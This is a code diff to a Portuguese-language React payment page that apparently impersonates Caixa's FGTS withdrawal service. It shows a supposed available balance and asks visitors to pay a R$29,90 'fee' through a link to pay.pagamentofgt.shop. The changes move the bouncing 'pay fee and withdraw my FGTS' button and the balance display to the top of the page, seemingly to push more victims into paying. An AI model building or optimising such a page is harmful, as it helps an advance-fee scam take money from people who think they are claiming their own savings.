@@ -11,7 +11,7 @@ import box from "../assets/box.png"
 // import carrinho from "../assets/carrinho.png"
 import logocaixa from "../assets/caixalogo.png"
 import flogo from "../assets/f-logo.png"
-import { BiDownArrowAlt } from "react-icons/bi";
+// import { BiDownArrowAlt } from "react-icons/bi";
 
 
 
@@ -119,14 +119,26 @@ export function PagamentoTarifa() {
                     </Helmet>
                 </div>
 
+                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
+                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
+                        PAGAR TAXA E SACAR MEU FGTS
+                    </button>
+                </a>
+
+                {/* Informações sobre o saque disponível */}
+                <div className="">
+                    <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
+                    <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
+                </div>
+
                 <div className="bg-primary w-full flex p-6 pb-10 flex-col items-center space-y-6">
                     <img width={300} src={caixa} alt="" />
-
+                    {/* 
                     <div className="flex items-center space-x-2 animate-bounce">
                         <BiDownArrowAlt className="text-white text-4xl" />
                         <div className="text-white text-3xl">Arraste para baixo</div>
                         <BiDownArrowAlt className="text-white text-4xl" />
-                    </div>
+                    </div> */}
                 </div>
 
                 <div className="space-y-4 w-full">
@@ -170,11 +182,7 @@ export function PagamentoTarifa() {
                 </div>
 
 
-                {/* Informações sobre o saque disponível */}
-                <div className="">
-                    <p className="text-xl mb-2 text-gray-500 my-2">Valor disponível para saque:</p>
-                    <p className="text-6xl font-semibold text-green-600">R$ {displayedAmount.toFixed(2)}</p>
-                </div>
+
 
                 <div className="flex items-center space-x-2">
                     <div className="bg-orange-500 p-2 rounded-full w-fit">
@@ -222,11 +230,7 @@ export function PagamentoTarifa() {
                     <p className="text-4xl font-semibold text-primary">R$29,90</p>
                 </div>
 
-                <a href="https://pay.pagamentofgt.shop/KV603k01qyEZw8y" className="w-full">
-                    <button className="bg-green-500 w-full hover:bg-green-600 text-white font-bold py-3 px-6 rounded-md shadow-lg transition-all duration-200 animate-bounce mt-3">
-                        PAGAR TAXA E SACAR MEU FGTS
-                    </button>
-                </a>
+
 
 
                 {/* Sessão com imagem do Pix e mensagem de justificativa */}
